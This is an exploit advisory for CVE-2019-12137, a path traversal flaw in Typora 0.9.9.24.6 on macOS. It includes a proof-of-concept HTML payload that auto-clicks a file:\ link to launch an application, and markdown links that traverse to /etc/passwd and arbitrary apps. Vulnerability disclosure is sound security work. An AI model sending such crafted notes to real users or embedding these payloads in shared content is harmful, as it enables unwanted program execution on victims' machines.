@@ -1,0 +1,48 @@
+# Exploit Title: Code execution via path traversal
+# Date: 17-05-2019
+# Exploit Author: Dhiraj Mishra
+# Vendor Homepage: http://typora.io
+# Software Link: https://typora.io/download/Typora.dmg
+# Version: 0.9.9.24.6
+# Tested on: macOS Mojave v10.14.4
+# CVE: CVE-2019-12137
+# References:
+# https://nvd.nist.gov/vuln/detail/CVE-2019-12137
+# https://github.com/typora/typora-issues/issues/2505
+
+Summary:
+Typora 0.9.9.24.6 on macOS allows directory traversal, for the execution of
+arbitrary programs, via a file:/// or ../ substring in a shared note via
+abusing URI schemes.
+
+Technical observation:
+A crafted URI can be used in a note to perform this attack using file:///
+has an argument or by traversing to any directory like
+(../../../../something.app).
+
+Since, Typro also has a feature of sharing notes, in such case attacker
+could leverage this vulnerability and send crafted notes to the
+victim to perform any further attack.
+
+Simple exploit code would be:
+
+<body>
+<a href="file:\\\Applications\Calculator.app" id=inputzero>
+  <img src="someimage.jpeg" alt="inputzero" width="104" height="142">
+</a>
+<script>
+(function download() {
+    document.getElementById('inputzero').click();
+})()
+</script>
+</body>
+
+
+
+
+And alt would be:
+
+```
+[Hello World](file:///../../../../etc/passwd)
+[Hello World](file:///../../../../something.app)
+```
